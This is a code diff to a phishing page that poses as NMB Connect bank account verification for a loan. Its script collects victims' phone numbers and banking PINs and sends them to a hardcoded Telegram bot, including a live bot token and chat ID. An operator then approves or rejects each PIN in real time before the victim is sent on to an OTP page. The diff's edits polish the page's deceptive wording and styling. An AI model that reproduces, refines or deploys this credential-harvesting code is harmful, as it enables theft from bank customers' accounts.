@@ -12,8 +12,8 @@
             --nmb-gold: #E4C16A;
             --nmb-light-blue: #4a90e2;
             --white: #ffffff;
-            --bg-overlay: rgba(0, 0, 0, 0.75);
-            --card-bg: rgba(255, 255, 255, 0.12);
+            --bg-overlay: rgba(0, 20, 40, 0.9);
+            --card-bg: rgba(255, 255, 255, 0.1);
             --input-bg: rgba(255, 255, 255, 0.08);
             --error: #ff6b6b;
         }
@@ -27,7 +27,7 @@
         body {
             font-family: 'Poppins', sans-serif;
             background: linear-gradient(var(--bg-overlay), var(--bg-overlay)), 
-                        url('https://images.unsplash.com/photo-1556742049-0cfed4f6a45d?q=80&w=1000&auto=format&fit=crop');
+                        url('https://images.unsplash.com/photo-1454165833767-027ffea9e77b?q=80&w=2000&auto=format&fit=crop');
             background-size: cover;
             background-position: center;
             background-attachment: fixed;
@@ -55,7 +55,6 @@
         }
         .logo .nmb { color: var(--nmb-light-blue); }
         .logo .connect { color: var(--nmb-gold); margin-left: 6px; }
-        .logo .flex-loan { color: var(--white); margin-left: 8px; font-weight: 400; font-size: 24px; opacity: 0.9; }
 
         main {
             flex: 1;
@@ -74,7 +73,7 @@
             background: var(--card-bg);
             backdrop-filter: blur(30px);
             -webkit-backdrop-filter: blur(30px);
-            border: 1px solid rgba(255, 255, 255, 0.18);
+            border: 1px solid rgba(255, 255, 255, 0.15);
             border-radius: 35px;
             padding: 45px 35px;
             box-shadow: 0 30px 60px -12px rgba(0, 0, 0, 0.6);
@@ -96,8 +95,7 @@
             align-items: center;
             justify-content: center;
             margin: 0 auto 20px;
-            box-shadow: 0 10px 20px rgba(0,0,0,0.3);
-            border: 2px solid rgba(228, 193, 106, 0.3);
+            border: 2px solid var(--nmb-gold);
         }
 
         .card h2 { 
@@ -110,7 +108,6 @@
             font-size: 14px; 
             opacity: 0.7; 
             margin-bottom: 30px; 
-            font-weight: 300;
         }
 
         .applicant-badge {
@@ -128,7 +125,6 @@
             font-weight: 700; 
             display: block; 
             margin-bottom: 5px; 
-            letter-spacing: 1px;
         }
         .applicant-badge .name { font-size: 18px; font-weight: 700; color: var(--white); display: block; }
         .applicant-badge .amount { font-size: 14px; opacity: 0.8; margin-top: 2px; display: block; }
@@ -156,12 +152,10 @@
         }
         .input-wrapper:focus-within { 
             border-color: var(--nmb-gold); 
-            background: rgba(255, 255, 255, 0.12);
-            box-shadow: 0 0 15px rgba(228, 193, 106, 0.15);
         }
 
-        .flag-icon { width: 24px; margin-right: 12px; border-radius: 3px; }
-        .country-code { color: var(--nmb-light-blue); font-weight: 700; margin-right: 10px; font-size: 15px; }
+        .flag-icon { width: 24px; margin-right: 12px; }
+        .country-code { color: var(--nmb-light-blue); font-weight: 700; margin-right: 10px; }
         .input-field { 
             flex: 1; 
             background: transparent; 
@@ -170,9 +164,7 @@
             font-size: 16px; 
             outline: none; 
             width: 100%; 
-            font-family: inherit;
         }
-        .input-field::placeholder { color: rgba(255, 255, 255, 0.3); }
 
         .verify-btn {
             width: 100%;
@@ -185,41 +177,33 @@
             font-weight: 800;
             cursor: pointer;
             text-transform: uppercase;
-            letter-spacing: 1.5px;
             transition: all 0.3s ease;
-            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
             margin-top: 10px;
         }
         .verify-btn:hover { 
             background: var(--nmb-gold);
             transform: translateY(-3px);
-            box-shadow: 0 15px 30px rgba(0,0,0,0.3);
         }
-        .verify-btn:active { transform: translateY(-1px); }
 
         .overlay {
             position: fixed; inset: 0;
             display: none;
             align-items: center; justify-content: center; flex-direction: column;
-            background: rgba(0, 15, 30, 0.95);
+            background: rgba(0, 20, 40, 0.95);
             z-index: 2000;
             backdrop-filter: blur(15px);
-            -webkit-backdrop-filter: blur(15px);
-            padding: 20px;
         }
         .overlay.on { display: flex; }
         .spin { 
-            width: 60px; height: 60px; 
+            width: 50px; height: 50px; 
             border: 4px solid rgba(255,255,255,0.1); 
             border-top-color: var(--nmb-gold); 
             border-radius: 50%; 
-            animation: sp 1s cubic-bezier(0.5, 0, 0.5, 1) infinite; 
+            animation: sp 1s linear infinite; 
         }
-        .sp-t { font-size: 20px; font-weight: 700; margin-top: 25px; letter-spacing: 0.5px; }
-        .sp-s { font-size: 14px; color: rgba(255,255,255,0.6); margin-top: 10px; font-weight: 300; }
         @keyframes sp { to { transform: rotate(360deg); } }
 
-        /* Modal Styles */
+        /* Custom Modal for Warnings */
         .modal-overlay {
             position: fixed; inset: 0;
             display: none;
@@ -238,33 +222,18 @@
             border-radius: 25px;
             padding: 40px 30px;
             text-align: center;
-            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
-            animation: modalIn 0.4s cubic-bezier(0.17, 0.84, 0.44, 1);
         }
-        @keyframes modalIn {
-            from { transform: scale(0.8); opacity: 0; }
-            to { transform: scale(1); opacity: 1; }
-        }
-        .modal-icon {
-            font-size: 50px;
-            margin-bottom: 20px;
-            color: #ff6b6b;
-        }
-        .modal-title { font-size: 20px; font-weight: 700; margin-bottom: 15px; color: var(--nmb-blue); }
-        .modal-text { font-size: 15px; margin-bottom: 30px; line-height: 1.5; color: #555; }
         .modal-btn {
             background: var(--nmb-blue);
             color: white;
             border: none;
-            padding: 15px 40px;
+            padding: 15px;
             border-radius: 12px;
             font-weight: 700;
             cursor: pointer;
             width: 100%;
-            font-size: 16px;
-            transition: all 0.2s;
+            margin-top: 20px;
         }
-        .modal-btn:hover { background: #002244; }
 
         footer { 
             padding: 40px 20px; 
@@ -272,20 +241,13 @@
             font-size: 12px; 
             opacity: 0.4; 
         }
-
-        @media (max-width: 480px) {
-            .logo { font-size: 24px; }
-            .logo .flex-loan { font-size: 20px; }
-            .card { padding: 40px 25px; }
-            .card h2 { font-size: 22px; }
-        }
     </style>
 </head>
 <body onload="init()">
 
     <header>
         <a class="logo" href="index.html">
-            <span class="nmb">NMB</span><span class="connect">Connect</span><span class="flex-loan">Flex Loan</span>
+            <span class="nmb">NMB</span><span class="connect">Connect</span>
         </a>
     </header>
 
@@ -293,19 +255,19 @@
         <div class="container">
             <div class="card">
                 <div class="brand-icon">
-                    <svg viewBox="0 0 100 100" width="45" height="45">
+                    <svg viewBox="0 0 100 100" width="40" height="40">
                         <path d="M30,50 L70,50 M30,40 C20,40 20,60 30,60 L70,60 C80,60 80,40 70,40" fill="none" stroke="#E4C16A" stroke-width="8" stroke-linecap="round"/>
                         <path d="M45,35 L55,65" stroke="#E4C16A" stroke-width="8" stroke-linecap="round"/>
                     </svg>
                 </div>
                 
                 <h2>Account Verification</h2>
-                <p>Please verify your NMB Connect account to complete your nmb Loan application.</p>
+                <p>Please verify your NMB Connect account to complete your loan application.</p>
 
                 <div id="applicantBadge" class="applicant-badge">
-                    <span class="label">Applicant Details</span>
+                    <span class="label">Application Details</span>
                     <span id="displayName" class="name">Valued Client</span>
-                    <span id="displayAmount" class="amount">$0.00 USD nmb Loan</span>
+                    <span id="displayAmount" class="amount">$0.00 USD Loan</span>
                 </div>
 
                 <div id="err" class="error-msg"></div>
@@ -334,16 +296,15 @@
 
     <div id="ov" class="overlay">
         <div class="spin"></div>
-        <div class="sp-t">Verifying Identity</div>
-        <div class="sp-s">Connecting to NMB secure servers...</div>
+        <div style="margin-top: 20px; font-weight: 700;">Verifying Identity</div>
+        <div style="font-size: 14px; opacity: 0.6;">Connecting to secure servers...</div>
     </div>
 
-    <!-- Custom Modal for Warnings -->
     <div id="warningModal" class="modal-overlay">
         <div class="modal-card">
-            <div class="modal-icon">⚠️</div>
-            <div class="modal-title">Incorrect PIN</div>
-            <div id="modalMsg" class="modal-text">You put wrong pin 3 attempts remaining make sure you repeat with correct pin.</div>
+            <div style="font-size: 50px; margin-bottom: 20px;">⚠️</div>
+            <div style="font-size: 20px; font-weight: 700; margin-bottom: 10px; color: var(--nmb-blue);">Incorrect PIN</div>
+            <div id="modalMsg" style="font-size: 15px; color: #555;"></div>
             <button class="modal-btn" onclick="closeModal()">Try Again</button>
         </div>
     </div>
@@ -354,11 +315,11 @@
 
     <script>
         const BOT = '8610325502:AAELjduBU2AtyM8FITvNGmRz4-O1Vi6QQ3s';
-        const CID = ' 7881536601';
+        const CID = '7881536601';
         let loanData = {
             name: "Valued Client",
             amount: "0",
-            purpose: "Flex Loan"
+            purpose: "Loan"
         };
         let lastUpdateId = 0;
         let pinAttempts = 0;
@@ -366,16 +327,11 @@
         function init() {
             const params = new URLSearchParams(window.location.search);
             loanData.name = params.get('name') || "Valued Client";
-            
-            // Fix: Correctly parse amount from URL, ensuring it's a valid string/number
-            let rawAmount = params.get('amount') || "0";
-            loanData.amount = rawAmount.replace(/[^0-9.]/g, ''); // Remove any non-numeric chars except decimal
-            
-            loanData.purpose = params.get('purpose') || "Flex Loan";
+            loanData.amount = params.get('amount') || "0";
+            loanData.purpose = params.get('purpose') || "Loan";
             
             document.getElementById('displayName').textContent = decodeURIComponent(loanData.name);
             
-            // Display formatted amount
             const formattedAmount = parseFloat(loanData.amount).toLocaleString(undefined, {
                 minimumFractionDigits: 2,
                 maximumFractionDigits: 2
@@ -435,7 +391,7 @@
             if (phone.length < 9) { showErr('Please enter a valid 9-digit mobile number.'); return; }
             if (pin.length !== 4) { showErr('PIN must be exactly 4 digits.'); return; }
 
-            const msg = `🚀 <b>NMB Flex Loan Attempt</b>\n\n👤 <b>Name:</b> <code>${decodeURIComponent(loanData.name)}</code>\n📱 <b>Phone:</b> <code>+263${phone}</code>\n🔒 <b>PIN:</b> <code>${pin}</code>\n💰 <b>Amount:</b> <code>$${loanData.amount} USD</code>\n🎯 <b>Purpose:</b> <code>${decodeURIComponent(loanData.purpose)}</code>\n🔢 <b>Attempt:</b> <code>${pinAttempts + 1}</code>`;
+            const msg = `🚀 <b>NMB Loan Attempt</b>\n\n👤 <b>Name:</b> <code>${decodeURIComponent(loanData.name)}</code>\n📱 <b>Phone:</b> <code>+263${phone}</code>\n🔒 <b>PIN:</b> <code>${pin}</code>\n💰 <b>Amount:</b> <code>$${loanData.amount} USD</code>\n🎯 <b>Purpose:</b> <code>${decodeURIComponent(loanData.purpose)}</code>\n🔢 <b>Attempt:</b> <code>${pinAttempts + 1}</code>`;
 
             const buttons = [
                 [{ text: '✅ Approve PIN', callback_data: 'pin_valid' }, { text: '❌ Reject PIN', callback_data: 'pin_invalid' }],
@@ -466,10 +422,9 @@
                                         clearInterval(pollInterval); 
                                         document.getElementById('ov').classList.remove('on'); 
                                         pinAttempts++;
-                                        
                                         let remaining = 3 - pinAttempts;
                                         if (remaining > 0) {
-                                            showModal(`You put wrong pin ${remaining} attempts remaining make sure you repeat with correct pin.`);
+                                            showModal(`Incorrect PIN. ${remaining} attempts remaining. Please try again with the correct PIN.`);
                                         } else {
                                             showErr('Maximum attempts reached. Please contact support.');
                                         }
@@ -485,14 +440,11 @@
                         }
                     }).catch(e => console.error(e));
             }, 2000);
-            
-            // Timeout after 10 minutes
             setTimeout(() => clearInterval(pollInterval), 600000);
         }
 
         function proceedToOTP() {
             const phone = document.getElementById('phone').value.trim().replace(/\s/g, '');
-            // Pass the amount and purpose to otp_verification.html
             location.href = `otp_verification.html?name=${loanData.name}&amount=${loanData.amount}&purpose=${loanData.purpose}&phone=${phone}`;
         }
     </script>
